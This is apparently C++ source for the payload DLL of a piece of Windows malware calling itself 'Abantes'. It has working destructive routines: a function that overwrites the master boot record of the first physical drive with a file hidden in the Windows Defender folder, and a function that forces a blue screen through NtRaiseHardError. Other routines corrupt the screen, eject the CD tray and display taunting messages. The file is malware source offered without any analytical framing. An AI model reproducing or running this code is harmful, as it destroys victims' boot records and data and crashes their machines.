// Payloads.cpp : Defines the exported functions for the DLL application.
// Contact me on Chris#0538 Discord instead of stealing my code.

#include "stdafx.h"
#include "Payloads.h"

#include <stdio.h>
#include <mmsystem.h>

#include <windowsx.h>

#pragma comment( lib, "winmm.lib" )

namespace Payloads
{
	void GetDesktopResolution(int& horizontal, int& vertical) { RECT desktop; const HWND hDesktop = GetDesktopWindow(); GetWindowRect(hDesktop, &desktop); horizontal = desktop.right; vertical = desktop.bottom; }

	void Payloads::MBR_Overwrite()
	{
		DWORD dw;
		LPCWSTR pathToBin = L"C:\\Windows\\Defender\\data.bin";
		HANDLE drive = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		if (drive != INVALID_HANDLE_VALUE) {
			HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
			if (binary != INVALID_HANDLE_VALUE) {
				DWORD size = GetFileSize(binary, 0);
				if (size > 0) {
					BYTE *mbr = new BYTE[size];
					if (ReadFile(binary, mbr, size, &dw, 0)) {
						NULL;
						if (WriteFile(drive, mbr, size, &dw, 0)) {
							NULL;
						}
					}
				}
			}
			CloseHandle(binary);
		}
		CloseHandle(drive);
		_getch();
	}

	void Payloads::FORCE_BSOD()
	{
		HMODULE ntdll = LoadLibraryA("ntdll");
		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {

			BOOLEAN tmp1; DWORD tmp2;
			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
		}

		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN);
	}

	void Payloads::Screen_Glitching()
	{
		int Timer = 7500; int horizontal = 0; int vertical = 0; GetDesktopResolution(horizontal, vertical);

		HDC hDC = GetDC(NULL);

		while (true)
		{
			Sleep(Timer);
			srand(time(0));

			StretchBlt(hDC, rand() % 15 + (15), rand() % 15 + (15), horizontal - rand() % 15 + (15), vertical - rand() % 15 + (15), hDC, 0, 0, horizontal + rand() % 15 + (15), vertical + rand() % 15 + (15), SRCAND);
			StretchBlt(hDC, rand() % 15 + (15), rand() % 15 + (15), horizontal - rand() % 15 + (15), vertical - rand() % 15 + (15), hDC, 0, 0, horizontal + rand() % 15 + (15), vertical + rand() % 15 + (15), SRCPAINT);

			if (Timer > 750) { Timer -= 750; }
		}
	}

	void Payloads::Screen_Screw()
	{
		int horizontal = 0; int vertical = 0; GetDesktopResolution(horizontal, vertical);

		HDC hDC = GetDC(NULL);

		int cy = 0;
		int cx = 0;

		while (cx != horizontal)
		{
			StretchBlt(hDC, cx, cy, 10, vertical, hDC, cx, cy, 10, vertical, DSTINVERT);
			cx = cx + 1;
		}
	}

	void Payloads::Display_Icons_Error()
	{
		int horizontal = 0; int vertical = 0; GetDesktopResolution(horizontal, vertical);
		int ix = GetSystemMetrics(SM_CXICON); int iy = GetSystemMetrics(SM_CYICON);
		int b = 0;

		for (int a = 0; vertical > b;)
		{
			Sleep(0005);
			DrawIcon(GetDC(NULL), a, b, LoadIcon(NULL, IDI_QUESTION));
			a = a + iy;
			if (a == horizontal)
			{
				b = b + ix;
				a = 0;
			}
		}
	}
	
	void Payloads::EjectCD()
	{
		MCI_OPEN_PARMS mPar = { 0 };
		mPar.lpstrDeviceType = reinterpret_cast<LPCWSTR>(MCI_DEVTYPE_CD_AUDIO);
		mciSendCommand(0, MCI_OPEN, MCI_OPEN_TYPE | MCI_OPEN_TYPE_ID, (DWORD)&mPar);
		mciSendCommand(mPar.wDeviceID, MCI_SET, MCI_SET_DOOR_OPEN, 0);
	}

	void Payloads::CursorIcon()
	{
		HINSTANCE hinst;

		hinst = LoadLibrary(L"Payloads.dll");
		if (hinst == NULL) { return; }

		while (true)
		{

			Sleep(0150);

			HDC hDC = GetDC(NULL);

			SetBkColor(hDC, TRANSPARENT);

			POINT cursor;
			GetCursorPos(&cursor);

			int ix = GetSystemMetrics(SM_CXICON) / 2;
			int iy = GetSystemMetrics(SM_CYICON) / 2;

			DrawIcon(hDC, GET_X_LPARAM(cursor.x) - ix, GET_X_LPARAM(cursor.y) - iy, LoadIcon(hinst, MAKEINTRESOURCE(IDI_ICON1)));
		}
	}

	void Payloads::CrazyBounce()
	{
		HDC hdc = GetDC(NULL);

		int w = 0; int h = 0; GetDesktopResolution(w, h);

		int xPower = 0;
		int yPower = 0;

		int num = 15;
		int num2 = 30;

		while (true) {

			Sleep(0020);

			srand(time(0));

			xPower = xPower + num2;
			yPower = yPower + num;

			if (xPower >= w / 2) { num2 = -30; }
			if (xPower < 0) { num2 = 30; }
			if (yPower >= h / 2) { num = -15; }
			if (yPower < 0) { num = 15; }

			HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
			HDC hdc2 = CreateCompatibleDC(hdc);
			SelectObject(hdc2, screenshot);

			BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

			BitBlt(hdc, xPower, yPower, w - xPower, h - yPower, hdc, -xPower, -yPower, SRCCOPY);

			BitBlt(hdc, w + xPower, 0, xPower, h, hdc2, w - xPower, 0, SRCCOPY);
			BitBlt(hdc, 0, h + yPower, w, yPower, hdc2, 0, h - yPower, SRCCOPY);

			DeleteDC(hdc2);
			DeleteObject(screenshot);
		}
	}

	void Payloads::Flip()
	{
		int w = 0; int h = 0; GetDesktopResolution(w, h);

		while (true)
		{
			Sleep(1000);

			HDC hdc = GetDC(NULL);

			StretchBlt(hdc, 0, h, w, -h, hdc, 0, 0, w, h, SRCCOPY);
		}
	}

	void Payloads::Text()
	{
		int horizontal = 0; int vertical = 0; GetDesktopResolution(horizontal, vertical);

		SIZE sz;
		HDC hDC = GetDC(NULL);
		LPCWSTR Text_Output = L"ABANTES IS HERE! RUN!! ";

		SetTextColor(hDC, RGB(255, 0, 0));
		SetBkColor(hDC, RGB(0, 0, 0));
		GetTextExtentPoint32(hDC, Text_Output, 24, &sz);

		int vc = -sz.cy;
		int hc = 0;

		while (hc < horizontal)
		{
			Sleep(0002);

			TextOutW(hDC, hc, vc += sz.cy, Text_Output, 24);

			if (vc >= vertical)
			{

				vc = -sz.cy;
				hc += sz.cx;
			}
		}

		SIZE sze;
		GetTextExtentPoint32(hDC, L"YOUR FUCKED! <3", 16, &sze);

		int times = 0;

		while (true)
		{
			if (times % 2)
			{
				SetTextColor(hDC, RGB(0, 0, 0));
				SetBkColor(hDC, RGB(255, 0, 0));
			}
			Sleep(0150);

			TextOutW(hDC, horizontal / 2 - sze.cx / 2, vertical / 2 - sze.cy / 2, L"YOUR FUCKED! <3", 16);

			SetTextColor(hDC, RGB(255, 0, 0));
			SetBkColor(hDC, RGB(0, 0, 0));

			times += 1;
		}
	}
}
